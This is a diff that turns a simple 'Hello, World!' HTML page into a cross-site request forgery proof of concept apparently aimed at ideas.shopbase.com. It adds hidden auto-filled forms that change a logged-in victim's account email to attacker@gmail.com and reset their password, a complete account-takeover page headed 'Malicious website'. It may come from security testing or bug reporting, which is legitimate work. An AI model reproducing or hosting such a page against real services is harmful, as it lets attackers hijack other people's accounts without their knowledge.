@@ -1,41 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello, World!</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        
-        .container {
-            text-align: center;
-        }
-
-        h1 {
-            color: #333;
-            font-size: 2em;
-        }
-
-        p {
-            color: #666;
-            font-size: 1.2em;
-        }
-    </style>
-    <meta name="p:domain_verify" content="61344a5f12e3601c5da0513323eaebaa"/>
-</head>
-<body>
-    <div class="container">
-        <h1>Hello, World!</h1>
-        <p>This is a simple HTML page.</p>
-    </div>
+<html>
+  <style>
+     h1,input {
+        color: red;
+        font-size: 16px;
+      }
+      h1{
+        font-size: 30px;
+        text-align: center;
+      }
+  </style>
+  <body>
+    <h1>Malicious website</h1>
+   <form
+      id="form1"
+      enctype="multipart/form-data"
+      method="POST"
+      action="https://ideas.shopbase.com/customers/accountInfo/profile/"
+    >
+      <input type="hidden" value="profile" name="section" />
+            <input
+              type="hidden"
+              value="attacker@gmail.com"
+              name="fields[email]"
+            />
+      <input
+        type="submit"
+        value="Update_email"
+      /></form>
+      <form
+      id="form2"
+      enctype="application/x-www-form-urlencoded"
+      method="POST"
+      action="https://ideas.shopbase.com/customers/resetPassword/"
+    >
+      <input type="hidden" value="?!Testpass123" name="user[password]" />
+      <input type="hidden" value="?!Testpass123" name="user[password_2]" />
+      <input type="submit" value="Change_password" />
+</form>
 </body>
 </html>
